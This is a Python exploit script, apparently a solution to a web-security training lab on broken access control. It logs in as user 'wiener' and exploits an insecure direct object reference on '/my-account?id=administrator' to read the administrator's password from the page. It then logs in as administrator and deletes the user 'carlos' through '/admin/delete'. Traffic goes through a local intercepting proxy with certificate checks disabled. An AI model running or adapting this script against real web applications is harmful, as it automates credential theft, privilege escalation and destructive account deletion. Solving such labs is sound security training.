import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}   

def get_csrf_token(s, url):
    
    r = s.get(url, proxies=proxies, verify=False)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf = soup.find("input", {"name": "csrf"})["value"]
    return csrf

def retrieve_admin_password(s, url):

    # Retrieve CSRF token from login page
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, login_url) 

    # Login as wiener
    print("(+) Logging in as 'wiener'...")
    data = {"username": "wiener", "password": "peter", "csrf": csrf_token}
    r = s.post(login_url, data=data, proxies=proxies, verify=False)
    res = r.text
    if "Log out" in res:
        print("(+) User 'wiener' logged in successfully.")

        #retrieve admin password using the access control vulnerability
        admin_url = url + "/my-account?id=administrator"
        r = s.get(admin_url, proxies=proxies, verify=False)
        res = r.text
        if "administrator" in res:
            print("(+) Accessed 'administrator' account successfully.")
            print("(+) Extracting administrator password from account page...")
            soup = BeautifulSoup(res, "html.parser") 
            password = soup.find("input", {"name": "password"})["value"]
            print("(+) Administrator password: " + password)
            return password

        else:
            print("(-) Failed to access 'administrator' account. Status code: %d" % r.status_code)
            print("(-) Exiting the script.")
            sys.exit(-1)
    else:
        print("(-) Failed to log in as 'wiener'. Status code: %d" % r.status_code)
        print("(-) Exiting the script.")
        sys.exit(-1)

def delete_carlos_url(s, url, admin_pass):
    
    # Retrieve CSRF token from login page
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, login_url) 

    # Login as administrator
    print("(+) Logging in as 'administrator'...")
    data = {"username": "administrator", "password": admin_pass, "csrf": csrf_token}
    r = s.post(login_url, data=data, proxies=proxies, verify=False)
    res = r.text
    if "Log out" in res:
        print("(+) User 'administrator' logged in successfully.")

        # Delete carlos account using the access control vulnerability
        print("(+) Attempting to delete 'carlos' account...")
        delete_carlos_url = url + "/admin/delete?username=carlos"
        r = s.get(delete_carlos_url, proxies=proxies, verify=False)
        if r.status_code == 200:
            print("(+) Carlos account deleted successfully.")
        else:
            print("(-) Failed to delete 'carlos' account. Status code: %d" % r.status_code)
            print("(-) Exiting the script.")
            sys.exit(-1)

    else:
        print("(-) Failed to log in as 'administrator'. Status code: %d" % r.status_code)
        print("(-) Exiting the script.")
        sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <URL>" % sys.argv[0])
        print("(+) Example: %s https://example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    admin_password = retrieve_admin_password(s, url)

    #delete carlos account 

    s = requests.Session()
    delete_carlos_url(s, url, admin_password)


if __name__ == "__main__":
    main()